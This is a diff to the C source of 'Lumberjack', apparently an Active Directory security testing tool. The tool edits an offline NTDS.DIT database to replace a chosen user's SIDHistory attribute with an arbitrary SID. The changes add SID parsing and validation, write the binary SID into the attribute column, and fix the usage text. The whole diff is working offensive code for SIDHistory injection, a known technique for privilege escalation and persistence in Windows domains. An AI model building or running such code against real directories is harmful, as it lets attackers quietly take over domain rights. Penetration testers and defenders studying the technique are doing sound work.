@@ -1,12 +1,16 @@
 /*
- * 
+ * Lumberjack: Active Directory forest security testing
+ *
+ * Copyright (c) 2014 Lluis Mora <lluismh@gmail.com>
  *
  */
 
+#define WINVER 0x0500
 #include <stdio.h>
 #include <getopt.h>
 #include <windows.h>
 #include <tchar.h>
+#include <sddl.h>
 #include "esent.h"
 
 #define DATASIZ 1024
@@ -58,7 +62,7 @@ int jet_db_initialize(JET_INSTANCE *db, JET_SESID *db_session, JET_DBID *db_id, 
 								err = JetSetSystemParameter(db, 0, 36, 1, NULL); // XXX: Not sure what this is?
 
 								if(err == JET_errSuccess) {
-									err = JetSetSystemParameter(db, 0, JET_paramEventSource, 0, "ADEDIT");
+									err = JetSetSystemParameter(db, 0, JET_paramEventSource, 0, "LJACK");
 
 									if(err == JET_errSuccess) {
 										err = JetSetSystemParameter(db, 0, JET_paramLogFileSize, 10240, NULL);
@@ -235,7 +239,8 @@ int main(int argc, char **argv) {
 	char *cfg_tmpedb = "temp.edb";
 	char *cfg_username = NULL;
 	char *cfg_newsid = NULL;
-	char sid[28];
+	PSID sid, old_sid;
+	int sid_length;
 
 	/* Parse options */
 	
@@ -290,8 +295,10 @@ int main(int argc, char **argv) {
 		exit(-1);
 	}
 
-	// TODO: Check SID format and convert to binary representation
-	strncpy(sid, cfg_newsid, 28);
+	if(ConvertStringSidToSid(cfg_newsid, &sid) == 0) {
+		log_error("Invalid SID format, it must be in the format S-R-I-S-S (e.g. S-1-5-32-...)\n");
+		exit(-1);
+	}	
 	
 	if(jet_db_initialize(&db, &db_session, &db_id, cfg_dbname, cfg_logdir, cfg_tmpedb) == 0) {
 		err = JetOpenTable(db_session, db_id, "datatable", NULL, 0, 8, &table_datatable);
@@ -325,15 +332,25 @@ int main(int argc, char **argv) {
 						}
 					}
 
-
 					cnt++;
 				} while(err == JET_errSuccess);
 
 				if(user_record >= 0) {
 					sidhistory_object_name = 1137; // 1137 -> ATTr590433 -> "SidHistory"?
 
-					if(jet_get_column_value(&db, &db_session, table_datatable, sidhistory_object_name, column_data, DATASIZ) > 0) {
-						log_ok("User has an existing SIDHistory entry that will be replaced: %s\n", column_data);
+					sid_length = jet_get_column_value(&db, &db_session, table_datatable, sidhistory_object_name, column_data, DATASIZ);
+
+					if(sid_length > 0) {
+						old_sid = (PSID) column_data;
+						
+						if(IsValidSid(old_sid)) {
+							LPTSTR sid_string;
+							if(ConvertSidToStringSid(old_sid, &sid_string) != 0) {
+								log_ok("User has an existing SIDHistory entry that will be replaced: %s\n", sid_string);
+								LocalFree(sid_string);
+								sid_string = NULL;
+							}	
+						}
 					}
 
 					err = JetBeginTransaction(db_session);
@@ -342,7 +359,7 @@ int main(int argc, char **argv) {
 						err = JetPrepareUpdate(db_session, table_datatable, 2); // TODO: PrepCode is not in MSDN?
 	
 						if(err == JET_errSuccess) {
-							err = JetSetColumn(db_session, table_datatable, 1137, &sid, 28, 0, NULL); // XXX: 1137, SidHistory :?
+							err = JetSetColumn(db_session, table_datatable, sidhistory_object_name, sid, GetLengthSid(sid), 0, NULL);
 
 							if(err == JET_errSuccess) {
 								err = JetUpdate(db_session, table_datatable, NULL, 0, NULL);
@@ -474,7 +491,7 @@ void usage (char *progname) {
         printf("\t -h --help                                Shows this help message\n"
                "\t -d --db <ntds_file>						Location of the NTDS.DIT file to modify\n"
                "\t -u --username <username>					User to add the new SID to, no need to specify domain name\n"
-               "\t -n --newsid <SID>						SID to add, in ths format: S-1-521-...\n"
+               "\t -n --newsid <SID>						SID to add, in the format: S-1-521-...\n"
                "\t -l --logdir <logdir>						Directory that contains ntds logfiles (if any). Defaults to the current directory\n"
                "\t -t --tmpedb <tmpedb_file>				Location of the TMP.EDB file that supports the NTDS.DIT file, if any. Defaults to tmp.db in the current directory\n"
 			   );
